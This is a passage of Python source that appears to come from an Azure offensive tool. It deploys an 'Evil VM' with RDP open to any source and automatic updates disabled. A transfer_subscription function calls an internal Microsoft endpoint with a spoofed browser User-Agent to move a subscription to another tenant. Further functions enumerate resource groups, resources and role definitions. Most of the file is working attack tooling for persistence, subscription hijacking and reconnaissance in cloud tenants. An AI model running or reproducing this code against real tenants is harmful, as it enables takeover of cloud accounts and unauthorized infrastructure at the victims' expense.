    vnet_list_url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/providers/Microsoft.Network/virtualNetworks?api-version=2023-05-01"
    try:
        vnet_list_response = requests.get(vnet_list_url, headers={"Authorization": f"Bearer {token}"})
        if vnet_list_response.status_code == 200:
            vnets = vnet_list_response.json().get('value', [])
            for vnet in vnets:
                if vnet.get('name') == vnet_name and vnet.get('location') == region:
                    provisioning_state = vnet.get('properties', {}).get('provisioningState', 'Unknown')
                    print(f"⚠️  WARNING: Virtual Network '{vnet_name}' already exists in region '{region}'!")
                    print(f"   Resource Group: {vnet.get('resourceGroup', 'Unknown')}")
                    print(f"   Provisioning State: {provisioning_state}")
                    if provisioning_state.lower() in ['deleting', 'failed']:
                        print(f"   This resource is in '{provisioning_state}' state - will cause 409 conflicts!")
                    else:
                        print(f"   This will definitely cause a 409 conflict.")
                    break
            else:
                print(f"✅ No conflicting Virtual Network '{vnet_name}' found in region '{region}'")
        elif vnet_list_response.status_code == 409:
            try:
                error_body = vnet_list_response.json()
                error_code = error_body.get('error', {}).get('code', '')
                if error_code == 'MissingSubscriptionRegistration':
                    print(f"⚠️  Microsoft.Network provider not registered - this explains the 409 conflicts!")
                    print(f"   Registration was initiated above and should resolve the issue")
            except:
                pass
    except Exception as e:
        print(f"❓ Could not check virtual networks: {e}")
    
    # Check for resources in deleting state that might conflict
    try:
        all_resources_url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resources?api-version=2021-04-01"
        all_resources_response = requests.get(all_resources_url, headers={"Authorization": f"Bearer {token}"})
        if all_resources_response.status_code == 200:
            resources = all_resources_response.json().get('value', [])
            deleting_resources = []
            for resource in resources:
                resource_name = resource.get('name', '')
                provisioning_state = resource.get('properties', {}).get('provisioningState', '')
                if (provisioning_state.lower() in ['deleting', 'failed'] and 
                    (resource_name.startswith(vm_name) or resource_name in [rg_name, vnet_name, nsg_name, ip_name, nic_name])):
                    deleting_resources.append({
                        'name': resource_name,
                        'type': resource.get('type', 'Unknown'),
                        'state': provisioning_state,
                        'location': resource.get('location', 'Unknown')
                    })
            
            if deleting_resources:
                print(f"⚠️  WARNING: Found {len(deleting_resources)} resources in problematic states:")
                for res in deleting_resources:
                    print(f"   - {res['name']} ({res['type']}) in '{res['state']}' state at {res['location']}")
                print(f"   These may cause 409 conflicts until fully deleted.")
            else:
                print(f"✅ No resources found in deleting/failed states with conflicting names")
    except Exception as e:
        print(f"❓ Could not check resource states: {e}")
    
    print("🚀 Starting resource creation...\n")
    
    try:
        # Step 1: Create Resource Group
        payload_rg = {
            "location": region,
            "tags": {"purpose": "guest-vm"}
        }
        if verbose:
            print("\n🔍 Resource Group Creation Payload:")
            print(json.dumps(payload_rg, indent=2))
        method_rg = "PUT"
        url_rg = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resourcegroups/{rg_name}?api-version=2021-04-01"
        logging.info(f"Creating resource group: {rg_name}")
        
        def create_rg_request():
            response = requests.put(url_rg, headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"}, json=payload_rg)
            # For 409 conflicts on RG creation, provide detailed error analysis
            if response.status_code == 409:
                try:
                    error_body = response.json()
                    error_code = error_body.get('error', {}).get('code', 'Unknown')
                    error_message = error_body.get('error', {}).get('message', 'No message')
                    print(f"\n🔍 DETAILED 409 CONFLICT ANALYSIS (Resource Group):")
                    print(f"   Error Code: {error_code}")
                    print(f"   Error Message: {error_message}")
                    print(f"   RG Name: {rg_name}")
                    print(f"   Region: {region}")
                    print()
                except:
                    pass
            return response
        
        resp_rg = _retry_azure_request("Resource Group creation", create_rg_request, verbose=verbose)
        if verbose:
            print(f"\n🔗 {method_rg} {url_rg}")
            print(f"Response: {resp_rg.status_code}")
            try:
                print(json.dumps(resp_rg.json(), indent=2))
            except Exception:
                print(resp_rg.text)
        results['resource_group'] = resp_rg.json()

        # Step 2: Create Virtual Network
        payload_vnet = {
            "location": region,
            "properties": {
                "addressSpace": {"addressPrefixes": ["10.0.0.0/16"]},
                "subnets": [{"name": "default", "properties": {"addressPrefix": "10.0.0.0/24"}}]
            }
        }
        if verbose:
            print("\n🔍 Virtual Network Creation Payload:")
            print(json.dumps(payload_vnet, indent=2))
        method_vnet = "PUT"
        url_vnet = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Network/virtualNetworks/{vnet_name}?api-version=2023-05-01"
        logging.info(f"Creating virtual network: {vnet_name}")
        
        def create_vnet_request():
            response = requests.put(url_vnet, headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"}, json=payload_vnet)
            # For 409 conflicts on VNet creation, provide detailed error analysis
            if response.status_code == 409:
                try:
                    error_body = response.json()
                    error_code = error_body.get('error', {}).get('code', 'Unknown')
                    error_message = error_body.get('error', {}).get('message', 'No message')
                    print(f"\n🔍 DETAILED 409 CONFLICT ANALYSIS:")
                    print(f"   Error Code: {error_code}")
                    print(f"   Error Message: {error_message}")
                    print(f"   VNet Name: {vnet_name}")
                    print(f"   Region: {region}")
                    print(f"   Resource Group: {rg_name}")
                    
                    # Common 409 causes for VNets
                    if error_code == 'MissingSubscriptionRegistration':
                        provider_match = None
                        if 'Microsoft.Network' in error_message:
                            provider_match = 'Microsoft.Network'
                        elif 'Microsoft.Compute' in error_message:
                            provider_match = 'Microsoft.Compute'
                        elif 'Microsoft.Storage' in error_message:
                            provider_match = 'Microsoft.Storage'
                        
                        print(f"   💡 CAUSE: Resource provider not registered")
                        print(f"   💡 SOLUTION: The subscription needs to register the {provider_match or 'required'} resource provider")
                        print(f"   💡 FIX: This should have been handled automatically above")
                        print(f"   💡 NOTE: Provider registration can take 2-10 minutes to complete")
                    elif 'already exists' in error_message.lower():
                        print(f"   💡 CAUSE: Virtual network name already in use")
                        print(f"   💡 SOLUTION: The VNet name '{vnet_name}' is already taken in this region")
                    elif 'being deleted' in error_message.lower() or 'deleting' in error_message.lower():
                        print(f"   💡 CAUSE: Resource is currently being deleted")
                        print(f"   💡 SOLUTION: Wait for deletion to complete before recreating")
                    elif 'resource group' in error_message.lower():
                        print(f"   💡 CAUSE: Resource group related conflict")
                        print(f"   💡 SOLUTION: Check resource group state and permissions")
                    else:
                        print(f"   💡 CAUSE: Unknown 409 conflict - see error message above")
                    print()
                except:
                    pass
            return response
        
        resp_vnet = _retry_azure_request("Virtual Network creation", create_vnet_request, verbose=verbose)
        if verbose:
            print(f"\n🔗 {method_vnet} {url_vnet}")
            print(f"Response: {resp_vnet.status_code}")
            try:
                print(json.dumps(resp_vnet.json(), indent=2))
            except Exception:
                print(resp_vnet.text)
        results['virtual_network'] = resp_vnet.json()

        # Step 3: Create Network Security Group
        payload_nsg = {
            "location": region,
            "properties": {
                "securityRules": [{
                    "name": "RDP",
                    "properties": {
                        "priority": 1000,
                        "protocol": "TCP",
                        "access": "Allow",
                        "direction": "Inbound",
                        "sourceAddressPrefix": "*",
                        "sourcePortRange": "*",
                        "destinationAddressPrefix": "*",
                        "destinationPortRange": "3389"
                    }
                }]
            }
        }
        if verbose:
            print("\n🔍 Network Security Group Creation Payload:")
            print(json.dumps(payload_nsg, indent=2))
        method_nsg = "PUT"
        url_nsg = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Network/networkSecurityGroups/{nsg_name}?api-version=2023-05-01"
        logging.info(f"Creating network security group: {nsg_name}")
        
        def create_nsg_request():
            return requests.put(url_nsg, headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"}, json=payload_nsg)
        
        resp_nsg = _retry_azure_request("Network Security Group creation", create_nsg_request, verbose=verbose)
        if verbose:
            print(f"\n🔗 {method_nsg} {url_nsg}")
            print(f"Response: {resp_nsg.status_code}")
            try:
                print(json.dumps(resp_nsg.json(), indent=2))
            except Exception:
                print(resp_nsg.text)
        results['network_security_group'] = resp_nsg.json()

        # Step 4: Create Public IP
        payload_ip = {
            "location": region,
            "sku": {"name": "Standard"},
            "properties": {"publicIPAllocationMethod": "Static"}
        }
        if verbose:
            print("\n🔍 Public IP Creation Payload:")
            print(json.dumps(payload_ip, indent=2))
        method_ip = "PUT"
        url_ip = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Network/publicIPAddresses/{ip_name}?api-version=2023-05-01"
        logging.info(f"Creating public IP: {ip_name}")
        
        def create_ip_request():
            return requests.put(url_ip, headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"}, json=payload_ip)
        
        resp_ip = _retry_azure_request("Public IP creation", create_ip_request, verbose=verbose)
        if verbose:
            print(f"\n🔗 {method_ip} {url_ip}")
            print(f"Response: {resp_ip.status_code}")
            try:
                print(json.dumps(resp_ip.json(), indent=2))
            except Exception:
                print(resp_ip.text)
        results['public_ip'] = resp_ip.json()


        # Step 5: Create Network Interface
        payload_nic = {
            "location": region,
            "properties": {
                "ipConfigurations": [{
                    "name": "ipconfig1",
                    "properties": {
                        "privateIPAllocationMethod": "Dynamic",
                        "subnet": {"id": f"/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Network/virtualNetworks/{vnet_name}/subnets/default"},
                        "publicIPAddress": {"id": f"/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Network/publicIPAddresses/{ip_name}"}
                    }
                }],
                "networkSecurityGroup": {"id": f"/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Network/networkSecurityGroups/{nsg_name}"}
            }
        }
        if verbose:
            print("\n🔍 Network Interface Creation Payload:")
            print(json.dumps(payload_nic, indent=2))
        method_nic = "PUT"
        url_nic = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Network/networkInterfaces/{nic_name}?api-version=2023-05-01"
        logging.info(f"Creating network interface: {nic_name}")
        
        def create_nic_request():
            return requests.put(url_nic, headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"}, json=payload_nic)
        
        resp_nic = _retry_azure_request("Network Interface creation", create_nic_request, verbose=verbose)
        if verbose:
            print(f"\n🔗 {method_nic} {url_nic}")
            print(f"Response: {resp_nic.status_code}")
            try:
                print(json.dumps(resp_nic.json(), indent=2))
            except Exception:
                print(resp_nic.text)
        results['network_interface'] = resp_nic.json()

        # Step 6: Create Virtual Machine
        payload_vm = {
            "location": region,
            "properties": {
                "hardwareProfile": {"vmSize": "Standard_B1s"},
                "storageProfile": {
                    "imageReference": {
                        "publisher": "MicrosoftWindowsDesktop",
                        "offer": "Windows-10",
                        "sku": "win10-22h2-pro",
                        "version": "latest"
                    },
                    "osDisk": {
                        "name": f"{vm_name}_OsDisk_1_{str(uuid4()).replace('-', '')}",
                        "caching": "ReadWrite",
                        "createOption": "FromImage",
                        "managedDisk": {"storageAccountType": "Standard_LRS"}
                    }
                },
                "osProfile": {
                    "computerName": vm_name,
                    "adminUsername": admin_username,
                    "adminPassword": admin_password,
                    "windowsConfiguration": {
                        "enableAutomaticUpdates": False,
                        "provisionVMAgent": True
                    }
                },
                "networkProfile": {
                    "networkInterfaces": [{
                        "id": f"/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Network/networkInterfaces/{nic_name}",
                        "properties": {"primary": True}
                    }]
                },
                "securityProfile": {"securityType": "Standard"}
            }
        }
        if verbose:
            print("\n🔍 Virtual Machine Creation Payload:")
            print(json.dumps(payload_vm, indent=2))
        method_vm = "PUT"
        url_vm = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Compute/virtualMachines/{vm_name}?api-version=2023-07-01"
        logging.info(f"Creating virtual machine: {vm_name}")
        
        def create_vm_request():
            return requests.put(url_vm, headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"}, json=payload_vm)
        
        resp_vm = _retry_azure_request("Virtual Machine creation", create_vm_request, verbose=verbose)
        if verbose:
            print(f"\n🔗 {method_vm} {url_vm}")
            print(f"Response: {resp_vm.status_code}")
            try:
                print(json.dumps(resp_vm.json(), indent=2))
            except Exception:
                print(resp_vm.text)
        results['virtual_machine'] = resp_vm.json()

        # Step 7: Install Azure AD Login Extension
        payload_ext = {
            "location": region,
            "properties": {
                "publisher": "Microsoft.Azure.ActiveDirectory",
                "type": "AADLoginForWindows",
                "typeHandlerVersion": "1.0",
                "autoUpgradeMinorVersion": True,
                "settings": {}
            }
        }
        if verbose:
            print("\n🔍 Azure AD Login Extension Creation Payload:")
            print(json.dumps(payload_ext, indent=2))
        method_ext = "PUT"
        url_ext = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resourceGroups/{rg_name}/providers/Microsoft.Compute/virtualMachines/{vm_name}/extensions/AADLoginForWindows?api-version=2023-07-01"
        logging.info(f"Installing Azure AD Login extension on: {vm_name}")
        
        def create_ext_request():
            return requests.put(url_ext, headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"}, json=payload_ext)
        
        resp_ext = _retry_azure_request("Azure AD Login Extension installation", create_ext_request, verbose=verbose)
        if verbose:
            print(f"\n🔗 {method_ext} {url_ext}")
            print(f"Response: {resp_ext.status_code}")
            try:
                print(json.dumps(resp_ext.json(), indent=2))
            except Exception:
                print(resp_ext.text)
        results['aad_extension'] = resp_ext.json()

        logging.info("Evil VM deployment completed successfully!")

        # Return summary information
        return {
            "status": "success",
            "vm_name": vm_name,
            "resource_group": rg_name,
            "region": region,
            "admin_username": admin_username,
            "resources_created": list(results.keys()),
            "details": results
        }

    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to create Evil VM: {e}")
        raise Exception(f"Evil VM deployment failed: {e}")
    except Exception as e:
        logging.error(f"Unexpected error during Evil VM creation: {e}")
        raise


def transfer_subscription(token: str, subscription_id: str, target_tenant_id: str) -> Optional[Dict[str, Any]]:
    """
    Transfer a subscription to another tenant using the internal subscription API.
    
    Args:
        token: Azure access token (must have appropriate permissions)
        subscription_id: ID of the subscription to transfer
        target_tenant_id: ID of the target tenant to transfer to
        
    Returns:
        Response data if successful, None if failed
    """
    # Use the internal subscription RP endpoint as discovered in transfer.py
    url = f"https://subscriptionrp.trafficmanager.net/internal/subscriptions/{subscription_id}/changeDirectory"
    
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        "x-ms-client-request-id": str(uuid4()),
        "x-ms-effective-locale": "en.en-us"
    }
    
    payload = {
        "tenantId": target_tenant_id
    }
    
    params = {
        "api-version": "2020-01-01-preview"
    }
    
    try:
        logging.info(f"Transferring subscription {subscription_id} to tenant {target_tenant_id}")
        response = requests.post(url, headers=headers, json=payload, params=params)
        
        if response.status_code == 200:
            logging.info("Subscription transfer initiated successfully")
            return response.json()
        elif response.status_code == 202:
            logging.info("Subscription transfer accepted and is being processed")
            return {"status": "accepted", "message": "Transfer is being processed"}
        else:
            logging.error(f"Failed to transfer subscription. Status: {response.status_code}, Response: {response.text}")
            return None
            
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to transfer subscription: {e}")
        return None


def get_resource_groups(token: str, subscription_id: str) -> List[Dict[str, Any]]:
    """
    Retrieve list of resource groups in a specific subscription.
    
    Args:
        token: Azure access token
        subscription_id: ID of the subscription to get resource groups from
        
    Returns:
        List of resource group objects or empty list on failure
    """
    url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resourceGroups"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    params = {
        "api-version": cfg.AZURE_API_VERSION
    }
    
    try:
        response = requests.get(url, headers=headers, params=params)
        response.raise_for_status()
        return response.json().get('value', [])
    except requests.exceptions.RequestException as e:
        error_msg = f"Failed to retrieve resource groups for subscription {subscription_id}: {e}"
        if 'response' in locals() and hasattr(response, 'text'):
            error_msg += f"\nAPI Response: {response.text}"
        logging.error(error_msg)
        return []


def get_resources_in_resource_group(token: str, subscription_id: str, resource_group_name: str) -> List[Dict[str, Any]]:
    """
    Retrieve list of resources in a specific resource group.
    
    Args:
        token: Azure access token
        subscription_id: ID of the subscription
        resource_group_name: Name of the resource group
        
    Returns:
        List of resource objects or empty list on failure
    """
    url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resourceGroups/{resource_group_name}/resources"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    params = {
        "api-version": cfg.AZURE_API_VERSION
    }
    
    try:
        response = requests.get(url, headers=headers, params=params)
        response.raise_for_status()
        return response.json().get('value', [])
    except requests.exceptions.RequestException as e:
        error_msg = f"Failed to retrieve resources for resource group {resource_group_name}: {e}"
        if 'response' in locals() and hasattr(response, 'text'):
            error_msg += f"\nAPI Response: {response.text}"
        logging.error(error_msg)
        return []


def get_all_subscription_resources(token: str, subscription_id: str) -> List[Dict[str, Any]]:
    """
    Retrieve all resources in a subscription across all resource groups.
    
    Args:
        token: Azure access token
        subscription_id: ID of the subscription
        
    Returns:
        List of all resource objects or empty list on failure
    """
    url = f"{cfg.AZURE_RESOURCE}/subscriptions/{subscription_id}/resources"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    params = {
        "api-version": cfg.AZURE_API_VERSION
    }
    
    try:
        response = requests.get(url, headers=headers, params=params)
        response.raise_for_status()
        return response.json().get('value', [])
    except requests.exceptions.RequestException as e:
        error_msg = f"Failed to retrieve all resources for subscription {subscription_id}: {e}"
        if 'response' in locals() and hasattr(response, 'text'):
            error_msg += f"\nAPI Response: {response.text}"
        logging.error(error_msg)
        return []


def query_resources_with_resource_graph(token: str, subscription_id: str, verbose: bool = False) -> Dict[str, Any]:
    """
    Use Azure Resource Graph API to query for all resource groups and resources in a subscription.
    This is the same method used by the Azure Portal and is much more efficient.
    
    Args:
        token: Azure access token
        subscription_id: ID of the subscription to query
        
    Returns:
        Dict containing resource groups and all resources, or empty dict on failure
    """
    url = f"{cfg.AZURE_RESOURCE}/providers/Microsoft.ResourceGraph/resources"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    
    params = {
        "api-version": "2021-03-01"
    }
    
    # Query for both resource groups and all resources in the subscription
    resource_groups_query = f"""
    resourcecontainers
    | where type =~ 'microsoft.resources/subscriptions/resourcegroups'
    | where subscriptionId =~ '{subscription_id}'
    | extend status = case(
        (properties.provisioningState =~ 'accepted'), 'Creating',
        (properties.provisioningState =~ 'deleted'), 'Deleted',
        (properties.provisioningState =~ 'deleting'), 'Deleting',
        (properties.provisioningState =~ 'failed'), 'Failed',
        (properties.provisioningState =~ 'movingresources'), 'Moving Resources',
        properties.provisioningState)
    | project id, name, type, location, subscriptionId, resourceGroup, kind, tags, extendedLocation, status, properties
    | sort by tolower(name) asc
    """
    
    all_resources_query = f"""
    resources
    | where subscriptionId =~ '{subscription_id}'
    | project id, name, type, kind, location, subscriptionId, resourceGroup, tags, properties, sku
    | sort by resourceGroup asc, type asc, tolower(name) asc
    """
    
    try:
        # First query: Get resource groups
        rg_payload = {
            "query": resource_groups_query,
            "subscriptions": [subscription_id],
            "options": {
                "resultFormat": "objectArray"
            }
        }

        headers["commandName"] = "fx.ResourceGroups.initial load"
        
        if verbose:
            print(f"🔍 RESOURCE GRAPH API REQUEST:")
            print(f"  URL: {url}")
            print(f"  Headers: Authorization: Bearer {token[:20]}...")
            print(f"  Resource Groups Query:")
            print(f"    {resource_groups_query.strip()}")
            print()
        
        logging.info(f"Querying resource groups for subscription {subscription_id}")
        rg_response = requests.post(url, headers=headers, params=params, json=rg_payload)
        rg_response.raise_for_status()
        rg_data = rg_response.json()
        
        if verbose:
            print(f"✅ Resource Groups query returned {len(rg_data.get('data', []))} results")
        
        # Second query: Get all resources
        resources_payload = {
            "query": all_resources_query,
            "subscriptions": [subscription_id],
            "options": {
                "resultFormat": "objectArray"
            }
        }
        
        if verbose:
            print(f"🔍 RESOURCE GRAPH API REQUEST:")
            print(f"  All Resources Query:")
            print(f"    {all_resources_query.strip()}")
            print()
        
        logging.info(f"Querying all resources for subscription {subscription_id}")
        resources_response = requests.post(url, headers=headers, params=params, json=resources_payload)
        resources_response.raise_for_status()
        resources_data = resources_response.json()
        
        if verbose:
            print(f"✅ All Resources query returned {len(resources_data.get('data', []))} results")
            print()
        
        return {
            "resource_groups": rg_data.get('data', []),
            "resources": resources_data.get('data', []),
            "status": "success"
        }
        
    except requests.exceptions.RequestException as e:
        error_msg = f"Failed to query resources with Resource Graph API: {e}"
        if 'rg_response' in locals() and hasattr(rg_response, 'text'):
            error_msg += f"\nResource Groups API Response: {rg_response.text}"
        if 'resources_response' in locals() and hasattr(resources_response, 'text'):
            error_msg += f"\nResources API Response: {resources_response.text}"
        logging.error(error_msg)
        return {"resource_groups": [], "resources": [], "status": "error", "error": error_msg}
    

def fetch_role_definitions(token, url):
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    try:
        resp = requests.get(url, headers=headers)

        if resp.status_code == 200:
            return resp.json().get("value", [])
    except Exception as e:
        logging.warning(f"Failed to fetch role definitions from {url}: {e}")
        return []

def get_all_role_definitions(token, subscription_id):
    # Built-in roles
    builtin_url = "https://management.azure.com/providers/Microsoft.Authorization/roleDefinitions?%24filter=type%20eq%20%27BuiltInRole%27&api-version=2022-05-01-preview"
    builtin_roles = fetch_role_definitions(token, builtin_url)
    # Custom roles (use subscription_id from args)
    custom_url = f"https://management.azure.com/subscriptions/{subscription_id}/providers/Microsoft.Authorization/roleDefinitions?%24filter=type%20eq%20%27CustomRole%27&api-version=2022-05-01-preview"
    custom_roles = fetch_role_definitions(token, custom_url)

    all_roles = {item["name"]: item for item in builtin_roles + custom_roles}

    return all_roles
    
def get_role_def_by_id(all_roles, role_id):
    role_id = role_id.split("/")[-1]
    role_def = all_roles.get(role_id, None)
    return role_def